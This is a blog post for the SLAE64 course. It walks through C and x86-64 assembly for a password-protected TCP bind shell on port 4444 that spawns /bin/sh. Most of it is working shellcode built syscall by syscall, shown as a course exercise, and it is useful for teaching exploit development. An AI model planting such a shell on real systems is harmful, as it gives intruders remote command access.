Assignment #1 – Bind shell with password
========================================

The objective of this assignment was to create a shellcode that binds to a port and, if provided with the correct password, spawns a shell. The final shellcode must not have any null bytes.

Writing the bind shell
----------------------

I started by writing the bind shell itself, with no password. To do this it's easier to start from a C version like the one below. This code has no error checking at all; and the shellcode won't have either.

    #include <stdlib.h>
    #include <unistd.h>
    #include <strings.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>

    int main(int argc, char **argv)
    {
        struct sockaddr_in server;
        int sock, new;
        char *arguments[] = {"/bin/sh", 0};
        
        sock = socket(AF_INET, SOCK_STREAM, 0);

        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[1]));
        server.sin_addr.s_addr = INADDR_ANY;
        bzero(&server.sin_zero, 8);

        bind(sock, (struct sockaddr *)&server, sizeof(server));
        listen(sock, 2);
        new = accept(sock, NULL, NULL);
        close(sock);

        dup2(new, 0);
        dup2(new, 1);
        dup2(new, 2);

        execve(arguments[0], arguments, NULL);
    }

Breaking it down we have seven parts:

  1. `socket()`. Create a socket to use in communications
  1. `bind()`. Bind a socket to an address
  1. `listen()`. Mark the socket as being able to accept incoming connections
  1. `accept()`. Accept connection requests and create new sockets
  1. `close()`. Close the listening socket
  1. `dup2()`. Duplicate file descriptors to connect `stdin`, `stdout` and `stderr` to the incoming connection
  1. `execve()`. Replace the current process image with `/bin/sh`

With the C code as reference each os these parts was implemented in assembly as follows.

----

### `socket()`

You need to call [`syscall(2)`][man_2_syscall] with the appropriate arguments. To figure out the values of the macros `AF_INET` and `SOCK_STREAM` you can use Python:

    $ python3
    >>>
    >>> import socket
    >>> socket.AF_INET
    <AddressFamily.AF_INET: 2>
    >>> socket.SOCK_STREAM
    <SocketKind.SOCK_STREAM: 1>

The numbers for syscalls can be found in `/usr/include/asm/unistd_64.h`. From that file we know `socket` corresponds to syscall 41.

    ...
    #define __NR_socket 41
    #define __NR_connect 42
    #define __NR_accept 43
    ...

You can a syscall by putting its number in RAX and its arguments in RDI, RSI, RDX, R10, R8, R9, in that order. Lastly you can the syscall with the `syscall` instruction. The return value of the syscall is stored in RAX. With all this information we are able to write the following code.

    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov rdi, rax

The return value is moved to RDI for later use in other syscalls.

### `bind()`

Calling [`bind(2)`][man_2_bind] is probably the part of this shellcode most prone to confusion. The first argument is the ID (know as "file descriptor") of the socket created by `socket`.

The second argument is a pointer to a structure of the type `sockaddr_in`. So you need to create this structure in memory and then get a pointer to it. To understand this structure [Beej's Guide to Network Programming][beej_sockaddr_in] is a valuable resource. We see `sockaddr_in` is declared as follows:

    struct sockaddr_in {
        short            sin_family;
        unsigned short   sin_port;
        struct in_addr   sin_addr;
        char             sin_zero[8];
    };

This definition lets you know the memory layout for the structure. `sin_family` and `sin_port` are `short` which correspond to 2 bytes. `sin_addr` is a `struct in_addr` which from Beej's Guide you can see corresponds to a `long`, i.e. 4 bytes. And lastly `sin_zero` is an 8-`char` array, or 8 bytes in total. So the memory layout of `sockaddr_in` in the stack can be represented as follows:

      0         1   2         3   4                       7
    +------+------+------+------+------+------+------+------+
    | sin_family  |  sin_port   |         sin_addr          |    ↑ lower addresses
    +------+------+------+------+------+------+------+------+    |  stack
    |                       sin_zero                        |    | higher addresses
    +------+------+------+------+------+------+------+------+

Since the stack grows from higher to lower addresses the structure members are pushed onto the stack in reverse order from the one they appear in the declaration: `sin_zero`, then `sin_addr`, `sin_port` and lastly `sin_family`.

In the C code you can see the port to bind to is passed to `htons()`. On x86(-64) this function basically swaps the two bytes of the port number. So if you pass 0x0d3d to `htons()` it would return 0x3d0d on such a system. Why is this needed? Because the [endianness][endianness] of the processor (little-endian) is not the same as that used by the network (big-endian). So you have to reverse the bytes of port numbers (and IP addresses) so that the network understands what you mean. And that is precisely what `htons()` or "host-to-network-short" does. You can use Python to do this conversion for you:

    $ python3
    >>>
    >>> import socket
    >>> hex(socket.htons(4444))
    '0x5c11'

At last the third argument to the `bind` syscall is the size of the address structure, which as seen in the memory diagram above is 16 bytes.

    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; INADDR_ANY = 0
    ; AF_INET = 2
    ; __NR_bind = 49

    xor rax, rax
    push rax
    mov dword [rsp-4], eax
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; bind
    mov rax, 49
    ; rdi already set before
    mov rsi, rsp ; &server
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall

### `listen()`

    ; listen(sock, 2)
    ; __NR_listen = 50

    mov rax, 50
    ; rdi already set before
    mov rsi, 2
    syscall

### `accept()`

The ID for a new socket is returned. The value is saved into RBX for later use with `dup2`.

    ; new = accept(sock, NULL, NULL);
    ; __NR_accept = 43

    mov rax, 43
    ; rdi already set before
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rbx, rax

### `close()`

Closing the listening socket is a good practice, but it is now strictly needed for the shellcode to work. I removed it in the final version.

    ; close(sock)
    ; __NR_close = 3

    mov rax, 3
    ; rdi already set before
    syscall

### `dup2()`

These [`dup(2)`][man_2_dup2] syscalls will make sure all keystrokes arriving through the connection are passed to the process that will be spawned (`/bin/sh`) and that its output and errors goes back into the connection.

    ; dup2(new, 0);
    ; dup2(new, 1);
    ; dup2(new, 2);
    ; __NR_dup2 = 33

    mov rax, 33
    mov rdi, rbx
    xor rsi, rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

### `execve()`

The shell is spawned by this part of the shellcode. I decided to use the execve stack method, which consists in calling [`execve(2)`][man_2_execve] after pushing its arguments to the stack.

    ; int execve(const char *path, char *const argv[], char *const envp[])
    ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
    ; rsi, argv = (char**) (/bin//sh, 0x00)
    ; rdx, envp = &0x00

    xor rax, rax
    push rax
    mov rdx, rsp ; *rdx = &0x00

    mov rsi, 0x68732f2f6e69622f
    push rsi
    mov rdi, rsp ; rdi = (char*) /bin//sh

    push rax
    push rdi
    mov rsi, rsp ; rsi = (char**) (/bin//sh, 0x00)

    mov al, 59
    syscall

We now have a TCP bind shell. Next we're going to password protect it.

Adding a password
-----------------

To password protect the shell we need to do two things:

1. define a password
1. read a password from the user
1. compare it with the correct password

If the password is correct the shellcode spawns a shell, otherwise it quits. I defined a few objectives for this shellcode that were not specified in the assignment:

- I wanted the password to be of *any size* up to at least 16 bytes
- and that it would be trival to change the password, no special knowledge needed

### Defining the password

Just define the bytes (`db`) of the password. It will also come in handy to know the size of the password. You could hardcode it, but instead I defined a byte that will have the result of `$-password`, i.e. subtract the address of the current line (`$`) to that of the `password` label, which gives us the length of the password.

This definition will allow to change the shellcode's password trivially by changing the first line.

    password: db "pass"
    pass_len: db $-password

### Read the password

    mov rax, 0
    mov rdi, 0    ; fd
    sub rsp, 16   ; create space for "buf" in the stack
    mov rsi, rsp  ; rsi = *buf
    mov rdx, 16
    syscall

    ; compare password
    xor rcx, rcx
    mov cl, [rel pass_len]
    lea rdi, [rel password]
    cld
    repz cmpsb
    jne exit


[man_2_syscall]: https://linux.die.net/man/2/syscall
[man_2_bind]: https://linux.die.net/man/2/bind
[man_2_dup2]: https://linux.die.net/man/2/dup2
[man_2_execve]: https://linux.die.net/man/2/execve
[beej_sockaddr_in]: https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
[endianness]: https://en.wikipedia.org/wiki/Endianness

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
